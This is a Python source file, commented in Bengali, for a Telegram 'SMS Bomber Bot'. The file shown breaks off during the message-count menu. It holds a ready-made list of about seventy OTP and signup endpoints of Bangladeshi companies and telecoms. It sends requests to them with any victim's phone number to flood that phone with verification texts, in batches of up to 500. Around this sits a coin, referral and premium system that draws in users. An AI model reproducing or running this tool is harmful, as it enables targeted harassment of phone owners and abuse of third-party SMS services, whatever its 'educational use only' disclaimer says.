import os
import json
import time
import random
import sqlite3
import requests
import threading
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ====================== ডাটাবেস সেটআপ ======================

class Database:
    def __init__(self, db_file="users.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
    
    def create_tables(self):
        # ইউজার টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                coins INTEGER DEFAULT 0,
                total_sent INTEGER DEFAULT 0,
                join_date TEXT,
                last_active TEXT,
                is_banned INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0
            )
        ''')
        
        # লগ টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                api_count INTEGER,
                success_count INTEGER,
                timestamp TEXT
            )
        ''')
        
        # রেফারেল টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referred_id INTEGER,
                timestamp TEXT
            )
        ''')
        
        self.conn.commit()
    
    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def add_user(self, user_id, username, first_name):
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT OR IGNORE INTO users (user_id, username, first_name, coins, join_date, last_active)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, username, first_name, 10, now, now))
        self.conn.commit()
    
    def update_coins(self, user_id, coins):
        self.cursor.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (coins, user_id))
        self.conn.commit()
    
    def get_coins(self, user_id):
        self.cursor.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
        result = self.cursor.fetchone()
        return result[0] if result else 0
    
    def add_log(self, user_id, phone, api_count, success_count):
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO logs (user_id, phone, api_count, success_count, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, api_count, success_count, now))
        self.conn.commit()
    
    def get_stats(self, user_id):
        self.cursor.execute("SELECT total_sent, coins FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def close(self):
        self.conn.close()

# ====================== API কনফিগারেশন (৭৫টি API) ======================

class ApiManager:
    @staticmethod
    def get_all_apis():
        """৭৫টি API-এর তালিকা"""
        apis = [
            # RedX
            {"name": "RedX Signup", "url": "https://api.redx.com.bd/v1/user/signup", "method": "POST", 
             "headers": {"Content-Type": "application/json"}, "body": {"phoneNumber": "{phone}"}},
            
            # KhaasFood
            {"name": "KhaasFood OTP", "url": "https://api.khaasfood.com/api/app/one-time-passwords/token?username={phone}", 
             "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
            
            # Bioscope
            {"name": "Bioscope Login", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"}, 
             "body": {"number": "+88{phone}"}},
            
            # Bikroy
            {"name": "Bikroy Login", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", 
             "method": "GET", "headers": {"Accept": "application/json"}},
            
            # Proiojon
            {"name": "Proiojon Signup", "url": "https://billing.proiojon.com/api/v1/auth/sign-up", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # BeautyBooth
            {"name": "BeautyBooth Signup", "url": "https://admin.beautybooth.com.bd/api/v2/auth/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # Medha
            {"name": "Medha OTP", "url": "https://developer.medha.info/api/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "880{phone}"}},
            
            # Deeptoplay
            {"name": "Deeptoplay Login", "url": "https://api.deeptoplay.com/v2/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"number": "+88{phone}"}},
            
            # Robi
            {"name": "Robi OTP", "url": "https://webapi.robi.com.bd/v1/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone_number": "{phone}"}},
            
            # Arogga
            {"name": "Arogga SMS", "url": "https://api.arogga.com/auth/v1/sms/send", 
             "method": "POST", "headers": {"Content-Type": "multipart/form-data"},
             "body": {"mobile": "{phone}"}},
            
            # MyGP
            {"name": "MyGP OTP", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/{phone}", 
             "method": "GET", "headers": {"Accept": "application/json"}},
            
            # BDSTall
            {"name": "BDSTall OTP", "url": "https://www.bdstall.com/userRegistration/save_otp_info/", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"Mobile": "{phone}"}},
            
            # BCS Exam
            {"name": "BCS Exam OTP", "url": "https://bcsexamaid.com/api/generateotp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            
            # DoctorLive
            {"name": "DoctorLive OTP", "url": "https://doctorlivebd.com/api/patient/auth/otpsend", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            
            # Sheba
            {"name": "Sheba OTP", "url": "https://accountkit.sheba.xyz/api/shoot-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88{phone}"}},
            
            # Apex4U
            {"name": "Apex4U Login", "url": "https://api.apex4u.com/api/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "{phone}"}},
            
            # Sindabad
            {"name": "Sindabad OTP", "url": "https://offers.sindabad.com/api/mobile-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88{phone}"}},
            
            # Kirei
            {"name": "Kirei OTP", "url": "https://app.kireibd.com/api/v2/send-login-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"email": "{phone}"}},
            
            # Shikho
            {"name": "Shikho SMS", "url": "https://api.shikho.com/auth/v2/send/sms", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # Circle
            {"name": "Circle Signup", "url": "https://reseller.circle.com.bd/api/v2/auth/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"email_or_phone": "+88{phone}"}},
            
            # BDTickets
            {"name": "BDTickets Auth", "url": "https://api.bdtickets.com:20100/v1/auth", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "+88{phone}"}},
            
            # Grameenphone
            {"name": "Grameenphone OTP", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # RFL BestBuy
            {"name": "RFL BestBuy Login", "url": "https://rflbestbuy.com/api/login/", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # Chorki
            {"name": "Chorki Login", "url": "https://api-dynamic.chorki.com/v1/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"number": "{phone}"}},
            
            # Hishab Express
            {"name": "Hishab Express Login", "url": "https://api.hishabexpress.com/login/status", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"msisdn": "{phone}"}},
            
            # Chorcha
            {"name": "Chorcha Auth Check", "url": "https://mujib.chorcha.net/auth/check?phone={phone}", 
             "method": "GET", "headers": {"accept": "*/*"}},
            
            # Wafilife
            {"name": "Wafilife OTP", "url": "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}", 
             "method": "GET", "headers": {}},
            
            # Robi Account
            {"name": "Robi Account OTP", "url": "https://webapi.robi.com.bd/v1/account/register/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone_number": "{phone}"}},
            
            # Chardike
            {"name": "Chardike OTP", "url": "https://api.chardike.com/api/otp/send", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # E-TestPaper
            {"name": "E-TestPaper OTP", "url": "https://prod.etestpaper.net/api/v4/auth/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # GPay
            {"name": "GPay Signup", "url": "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            
            # Applink
            {"name": "Applink OTP", "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "88{phone}"}},
            
            # Priyoshikkhaloy
            {"name": "Priyoshikkhaloy", "url": "https://app.priyoshikkhaloy.com/api/user/register-login.php", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            
            # Kabbik
            {"name": "Kabbik OTP", "url": "https://api.kabbik.com/v1/auth/otpnew", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # Salextra
            {"name": "Salextra", "url": "https://salextra.com.bd/customer/checkusernameavailabilityonregistration", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"username": "{phone}"}},
            
            # Sundora
            {"name": "Sundora", "url": "https://api.sundora.com.bd/api/user/customer/", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "+880{phone}"}},
            
            # MyGP Cinematic
            {"name": "MyGP Cinematic", "url": "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # Bajistar
            {"name": "Bajistar", "url": "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}", 
             "method": "GET", "headers": {}},
            
            # Doctime
            {"name": "Doctime", "url": "https://api.doctime.com.bd/api/authenticate", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"contact_no": "{phone}"}},
            
            # Grameenphone FI
            {"name": "Grameenphone FI", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"msisdn": "{phone}"}},
            
            # Meenabazar
            {"name": "Meenabazar", "url": "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # Medeasy
            {"name": "Medeasy", "url": "https://api.medeasy.health/api/send-otp/+88{phone}/", 
             "method": "GET", "headers": {}},
            
            # Iqra Live
            {"name": "Iqra Live", "url": "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", 
             "method": "GET", "headers": {}},
            
            # Chokrojan
            {"name": "Chokrojan", "url": "https://chokrojan.com/api/v1/passenger/login/mobile", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile_number": "{phone}"}},
            
            # Shomvob
            {"name": "Shomvob", "url": "https://backend-api.shomvob.co/api/v2/otp/phone", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "88{phone}"}},
            
            # RedX 2
            {"name": "RedX Signup 2", "url": "https://api.redx.com.bd/v1/user/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "{phone}"}},
            
            # MyGP Send OTP
            {"name": "MyGP Send OTP", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # BDJobs
            {"name": "BDJobs", "url": "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            
            # Ultimate Organic
            {"name": "Ultimate Organic Register", "url": "https://ultimateasiteapi.com/api/register-customer", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"customer_contact": "{phone}"}},
            
            # Foodaholic
            {"name": "Foodaholic", "url": "https://foodaholic.com.bd/api/v1/auth/forgot-password", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "+88{phone}"}},
            
            # KFC BD
            {"name": "KFC BD", "url": "https://api.kfcbd.com/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            
            # GP Offer
            {"name": "GP Offer OTP", "url": "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            
            # Eonbazar
            {"name": "Eonbazar Register", "url": "https://app.eonbazar.com/api/auth/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            
            # Eat-Z
            {"name": "Eat-Z", "url": "https://api.eat-z.com/auth/customer/app-connect", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"username": "+880{phone}"}},
            
            # Osudpotro
            {"name": "Osudpotro", "url": "https://api.osudpotro.com/api/v1/users/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88-{phone}"}},
            
            # Kormi24
            {"name": "Kormi24", "url": "https://api.kormi24.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # Weblogin GP
            {"name": "Weblogin GP", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            
            # Shwapno
            {"name": "Shwapno", "url": "https://www.shwapno.com/api/auth", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "+88{phone}"}},
            
            # Quizgiri
            {"name": "Quizgiri", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # Banglalink MyBL
            {"name": "Banglalink MyBL", "url": "https://myblapi.banglalink.net/api/v1/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # Walton Plaza
            {"name": "Walton Plaza", "url": "https://api.waltonplaza.com.bd/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # PBS
            {"name": "PBS", "url": "https://apialpha.pbs.com.bd/api/OTP/generateOTP", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"userPhone": "{phone}"}},
            
            # Aarong
            {"name": "Aarong", "url": "https://mcprod.aarong.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # Arogga App
            {"name": "Arogga App", "url": "https://api.arogga.com/auth/v1/sms/send", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            
            # Sundarban Courier
            {"name": "Sundarban Courier", "url": "https://api-gateway.sundarbancourierltd.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            
            # QuizTime
            {"name": "QuizTime", "url": "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # DressUp
            {"name": "DressUp", "url": "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            
            # Ghoori Learning
            {"name": "Ghoori Learning", "url": "https://api.ghoorilearning.com/api/auth/signup/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile_no": "{phone}"}},
            
            # Garibook
            {"name": "Garibook", "url": "https://api.garibookadmin.com/api/v3/user/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            
            # Fabrilife Signup
            {"name": "Fabrilife Signup", "url": "https://fabrilife.com/api/wp-json/wc/v2/user/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            
            # Fabrilife OTP
            {"name": "Fabrilife OTP", "url": "https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{phone}", 
             "method": "POST", "headers": {}},
            
            # BTCL BDIA
            {"name": "BTCL BDIA", "url": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobileNo": "{phone}"}},
            
            # BTCL PhoneBill
            {"name": "BTCL PhoneBill", "url": "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNbr": "{phone}"}},
        ]
        return apis

    @staticmethod
    def send_request(api, phone):
        """একটি API-তে রিকুয়েস্ট পাঠায়"""
        try:
            url = api["url"].replace("{phone}", phone)
            headers = api.get("headers", {})
            
            if api["method"] == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:
                body = api.get("body", {})
                if body:
                    # বডিতে {phone} রিপ্লেস
                    for key in body:
                        if isinstance(body[key], str):
                            body[key] = body[key].replace("{phone}", phone)
                
                if "application/json" in str(headers.get("Content-Type", "")):
                    response = requests.post(url, headers=headers, json=body, timeout=5)
                else:
                    response = requests.post(url, headers=headers, data=body, timeout=5)
            
            return response.status_code in [200, 201, 202, 204]
        except:
            return False

# ====================== টেলিগ্রাম বট ======================

class SMSBomberBot:
    def __init__(self, token):
        self.token = token
        self.db = Database()
        self.apis = ApiManager()
        self.user_states = {}  # ইউজার স্টেট ট্র্যাক করার জন্য
        
        # কয়েন কনফিগারেশন
        self.COINS_PER_SMS = 1
        self.DAILY_BONUS = 5
        self.REFERRAL_BONUS = 10
        self.PREMIUM_PRICE = 50
        
        # ফোর্স জয়েন কনফিগারেশন
        self.CHANNEL_USERNAME = "BlackoutZoneRBX404"  # আপনার চ্যানেলের ইউজারনেম
        self.CHANNEL_ID = -1003816732910  # আপনার চ্যানেলের আইডি
        
        # মেসেজ কাউন্ট অপশন
        self.MESSAGE_COUNTS = [10, 25, 50, 75, 100, 200, 500]
    
    def check_channel_membership(self, user_id):
        """ইউজার চ্যানেলের মেম্বার কিনা চেক করে"""
        try:
            # টেলিগ্রাম API ব্যবহার করে চেক
            # নোট: বটকে চ্যানেলের অ্যাডমিন হতে হবে
            chat_member = self.app.bot.get_chat_member(self.CHANNEL_ID, user_id)
            return chat_member.status in ["member", "administrator", "creator"]
        except:
            return False
    
    def get_join_keyboard(self):
        """ফোর্স জয়েনের জন্য কীবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("📢 চ্যানেল জয়েন করুন", url=f"https://t.me/BlackoutZoneRBX404")],
            [InlineKeyboardButton("✅ চেক করুন", callback_data="check_join")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_main_keyboard(self):
        """মেনু কীবোর্ড"""
        keyboard = [
            [InlineKeyboardButton("📱 SMS বোমা", callback_data="send_bomb")],
            [InlineKeyboardButton("🪙 কয়েন", callback_data="coins")],
            [InlineKeyboardButton("📊 স্ট্যাটাস", callback_data="stats")],
            [InlineKeyboardButton("👥 রেফার", callback_data="refer")],
            [InlineKeyboardButton("⭐ প্রিমিয়াম", callback_data="premium")],
            [InlineKeyboardButton("📖 সাহায্য", callback_data="help")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """স্টার্ট কমান্ড"""
        user = update.effective_user
        user_id = user.id
        
        # ইউজার যোগ করা
        self.db.add_user(user_id, user.username, user.first_name)
        
        # চ্যানেল চেক
        if not await self.check_channel_membership(user_id):
            await update.message.reply_text(
                f"👋 হ্যালো {user.first_name}!\n\n"
                f"⚠️ এই বট ব্যবহার করতে হলে আমাদের চ্যানেলে জয়েন করতে হবে!\n\n"
                f"নিচের বাটনে ক্লিক করে চ্যানেল জয়েন করুন তারপর 'চেক করুন' বাটনে ক্লিক করুন।",
                reply_markup=self.get_join_keyboard()
            )
            return
        
        welcome_text = f"""
🔥 **SMS Bomber Bot**

👋 হ্যালো {user.first_name}!

📱 এই বট দিয়ে আপনি যেকোনো নম্বরে ৭৫টি ভিন্ন ভিন্ন API থেকে OTP/SMS পাঠাতে পারবেন।

🪙 **কয়েন সিস্টেম:**
• ১টি SMS = ১ কয়েন
• প্রতিদিন বোনাস: {self.DAILY_BONUS} কয়েন
• রেফারেল বোনাস: {self.REFERRAL_BONUS} কয়েন

⚡ **মনে রাখবেন:**
• বটটি শুধুমাত্র শিক্ষাগত উদ্দেশ্যে
• কারও বিরুদ্ধে ব্যবহার করা অবৈধ

নিচের মেনু থেকে আপনার কাজ নির্বাচন করুন।
"""
        await update.message.reply_text(welcome_text, reply_markup=self.get_main_keyboard())
    
    async def check_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """চ্যানেল জয়েন চেক করার কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if await self.check_channel_membership(user_id):
            await query.edit_message_text(
                "✅ চ্যানেল জয়েন সফল! এখন আপনি বট ব্যবহার করতে পারবেন।\n\n"
                "নিচের মেনু থেকে আপনার কাজ নির্বাচন করুন।",
                reply_markup=self.get_main_keyboard()
            )
        else:
            await query.edit_message_text(
                "❌ আপনি এখনও চ্যানেল জয়েন করেননি!\n\n"
                "দয়া করে নিচের লিংকে ক্লিক করে চ্যানেল জয়েন করুন এবং আবার চেক করুন।",
                reply_markup=self.get_join_keyboard()
            )
    
    async def coins_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """কয়েন দেখানোর কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        coins = self.db.get_coins(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🔄 ডেইলি বোনাস", callback_data="daily_bonus")],
            [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"🪙 **আপনার কয়েন:** {coins}\n\n"
            f"📊 **কয়েন পাওয়ার উপায়:**\n"
            f"• ১টি SMS = +{self.COINS_PER_SMS} কয়েন\n"
            f"• ডেইলি বোনাস = +{self.DAILY_BONUS} কয়েন\n"
            f"• রেফারেল = +{self.REFERRAL_BONUS} কয়েন\n\n"
            f"⭐ **প্রিমিয়াম:** {self.PREMIUM_PRICE} কয়েন",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    async def daily_bonus_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ডেইলি বোনাস কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        # ডেইলি বোনাস চেক (শেষ বোনাসের সময় মনে রাখা)
        last_bonus = context.user_data.get("last_bonus", datetime.min)
        now = datetime.now()
        
        if (now - last_bonus).days >= 1:
            self.db.update_coins(user_id, self.DAILY_BONUS)
            context.user_data["last_bonus"] = now
            
            await query.edit_message_text(
                f"✅ ডেইলি বোনাস সফল!\n"
                f"🪙 +{self.DAILY_BONUS} কয়েন পেয়েছেন!\n"
                f"📊 মোট কয়েন: {self.db.get_coins(user_id)}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
        else:
            remaining = timedelta(days=1) - (now - last_bonus)
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            
            await query.edit_message_text(
                f"⏳ আপনি ইতিমধ্যে ডেইলি বোনাস নিয়েছেন!\n\n"
                f"পরবর্তী বোনাস পেতে অপেক্ষা করুন: {hours} ঘন্টা {minutes} মিনিট",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
    
    async def stats_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """স্ট্যাটাস কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        stats = self.db.get_stats(user_id)
        coins = self.db.get_coins(user_id)
        
        # মোট ইউজার কাউন্ট
        self.db.cursor.execute("SELECT COUNT(*) FROM users")
        total_users = self.db.cursor.fetchone()[0]
        
        await query.edit_message_text(
            f"📊 **আপনার স্ট্যাটাস**\n\n"
            f"👤 ইউজার আইডি: `{user_id}`\n"
            f"🪙 কয়েন: {coins}\n"
            f"📨 মোট SMS: {stats[0] if stats else 0}\n"
            f"👥 মোট ইউজার: {total_users}\n"
            f"⭐ প্রিমিয়াম: {'✅ হ্যাঁ' if stats[1] > 0 else '❌ না' if stats else '❌ না'}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
        )
    
    async def refer_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """রেফারেল কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        # রেফারেল লিংক
        bot_username = context.bot.username
        refer_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        
        await query.edit_message_text(
            f"👥 **রেফারেল প্রোগ্রাম**\n\n"
            f"প্রতি রেফারেলের জন্য পান: +{self.REFERRAL_BONUS} কয়েন\n\n"
            f"আপনার রেফারেল লিংক:\n`{refer_link}`\n\n"
            f"এই লিংকটি শেয়ার করে বন্ধুদের আমন্ত্রণ জানান!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 শেয়ার করুন", switch_inline_query=refer_link)],
                [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
            ])
        )
    
    async def premium_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """প্রিমিয়াম কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        coins = self.db.get_coins(user_id)
        
        if coins >= self.PREMIUM_PRICE:
            keyboard = [
                [InlineKeyboardButton("⭐ প্রিমিয়াম কিনুন", callback_data="buy_premium")],
                [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
            ]
            
            await query.edit_message_text(
                f"⭐ **প্রিমিয়াম ফিচার:**\n\n"
                f"• Unlimited SMS (কোন কয়েন লাগবে না)\n"
                f"• ২৫০টি API অ্যাক্সেস (সবগুলো)\n"
                f"• প্রায়োরিটি সাপোর্ট\n\n"
                f"**মূল্য:** {self.PREMIUM_PRICE} কয়েন\n"
                f"আপনার কয়েন: {coins}\n\n"
                f"প্রিমিয়াম কিনতে নিচের বাটনে ক্লিক করুন।",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_text(
                f"❌ আপনার পর্যাপ্ত কয়েন নেই!\n\n"
                f"প্রিমিয়ামের জন্য প্রয়োজন: {self.PREMIUM_PRICE} কয়েন\n"
                f"আপনার আছে: {coins} কয়েন\n\n"
                f"কয়েন বাড়ানোর উপায়:\n"
                f"• SMS পাঠান (+{self.COINS_PER_SMS} কয়েন)\n"
                f"• ডেইলি বোনাস নিন (+{self.DAILY_BONUS} কয়েন)\n"
                f"• রেফারেল করুন (+{self.REFERRAL_BONUS} কয়েন)",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
    
    async def buy_premium_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """প্রিমিয়াম কেনার কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        coins = self.db.get_coins(user_id)
        
        if coins >= self.PREMIUM_PRICE:
            self.db.update_coins(user_id, -self.PREMIUM_PRICE)
            self.db.cursor.execute("UPDATE users SET is_premium = 1 WHERE user_id = ?", (user_id,))
            self.db.conn.commit()
            
            await query.edit_message_text(
                f"✅ **প্রিমিয়াম সক্রিয়!**\n\n"
                f"🎉 আপনার এখন Unlimited SMS সুবিধা পাচ্ছেন!\n"
                f"🪙 বাকি কয়েন: {self.db.get_coins(user_id)}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]])
            )
        else:
            await query.edit_message_text(
                "❌ পর্যাপ্ত কয়েন নেই!",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="premium")]])
            )
    
    async def send_bomb_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """SMS বোমা পাঠানোর কলব্যাক"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        # চ্যানেল চেক
        if not await self.check_channel_membership(user_id):
            await query.edit_message_text(
                "⚠️ চ্যানেল জয়েন করতে হবে!",
                reply_markup=self.get_join_keyboard()
            )
            return
        
        # কয়েন চেক
        coins = self.db.get_coins(user_id)
        is_premium = self.db.get_user(user_id)[7] == 1  # is_premium
        
        if coins < 5 and not is_premium:
            await query.edit_message_text(
                f"❌ পর্যাপ্ত কয়েন নেই!\n\n"
                f"আপনার কয়েন: {coins}\n"
                f"নূন্যতম প্রয়োজন: ৫ কয়েন\n\n"
                f"কয়েন বাড়ানোর উপায়:\n"
                f"• ডেইলি বোনাস নিন\n"
                f"• রেফারেল করুন",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="coins")]])
            )
            return
        
        # মেসেজ কাউন্ট সিলেক্ট কীবোর্ড
        keyboard = []
        row = []
        for i, count in enumerate(self.MESSAGE_COUNTS):
            row.append(InlineKeyboardButton(f"{count}", callback_data=f"count_{count}"))
            if len(row) == 3:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
